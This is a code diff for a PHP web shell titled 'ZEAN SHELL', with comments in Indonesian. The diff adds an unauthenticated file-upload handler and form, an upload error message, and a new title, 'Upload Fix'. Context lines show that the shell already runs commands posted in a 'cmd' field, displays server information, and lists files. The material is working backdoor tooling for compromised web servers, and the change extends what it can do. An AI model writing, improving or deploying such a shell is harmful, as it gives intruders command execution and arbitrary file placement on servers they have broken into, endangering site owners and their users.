@@ -33,6 +33,30 @@ function build_url($params = []) {
     return '?' . http_build_query($params);
 }
 
+// Handle file upload dengan pengecekan error
+$upload_error_msg = '';
+if (isset($_FILES['upload'])) {
+    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {
+        $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+        if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
+            // Sukses upload
+        } else {
+            $upload_error_msg = "Gagal memindahkan file upload.";
+        }
+    } else {
+        $upload_error_msg = "Error upload file: " . $_FILES['upload']['error'];
+    }
+    if ($upload_error_msg !== '') {
+        // Jangan redirect langsung jika ada error supaya bisa ditampilkan
+        // tapi supaya sederhana, kita tetap redirect dan bisa cek error via GET param juga.
+        header("Location: " . build_url(['path' => $path, 'upload_error' => urlencode($upload_error_msg)]));
+        exit;
+    } else {
+        header("Location: " . build_url(['path' => $path]));
+        exit;
+    }
+}
+
 $output = '';
 if (isset($_POST['cmd'])) {
     chdir($path);
@@ -51,7 +75,7 @@ $uname = php_uname();
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<title>🌐 ZEAN SHELL (Minimal)</title>
+<title>🌐 ZEAN SHELL (Upload Fix)</title>
 <style>
     body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px; }
     a { color: #61dafb; text-decoration: none; }
@@ -63,10 +87,11 @@ $uname = php_uname();
     .col-size { min-width: 12%; text-align: right; }
     .col-user, .col-group, .col-perm { min-width: 10%; text-align: center; }
     .col-time { min-width: 20%; }
+    .error-msg { color: #e74c3c; margin-bottom: 10px; font-weight: bold; }
 </style>
 </head>
 <body>
-<h1>🌐 ZEAN SHELL (Minimal)</h1>
+<h1>🌐 ZEAN SHELL (Upload Fix)</h1>
 
 <div>
     <b>Server Info:</b> <?= htmlspecialchars($server_ip) ?> |
@@ -79,6 +104,10 @@ $uname = php_uname();
 <div style="margin-top:10px; margin-bottom:10px;">
     <a href="<?= build_url(['path' => $initial_path]) ?>">🔙 Back to Root</a>
 </div>
+
+<?php if (isset($_GET['upload_error'])): ?>
+    <div class="error-msg"><?= htmlspecialchars(urldecode($_GET['upload_error'])) ?></div>
+<?php endif; ?>
 
 <div id="file-list">
 <?php
@@ -131,6 +160,16 @@ foreach ($all as $file) {
     </div>";
 }
 ?>
+</div>
+
+<div style="margin-top: 20px;">
+    <h3>Upload File</h3>
+    <form method="POST" enctype="multipart/form-data">
+        <input type="file" name="upload" style="width:100%;">
+        <input type="hidden" name="lelah" value="">
+        <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
+        <input type="submit" value="Upload" style="width:100%; margin-top:5px;">
+    </form>
 </div>
 
 <div style="margin-top: 20px;">
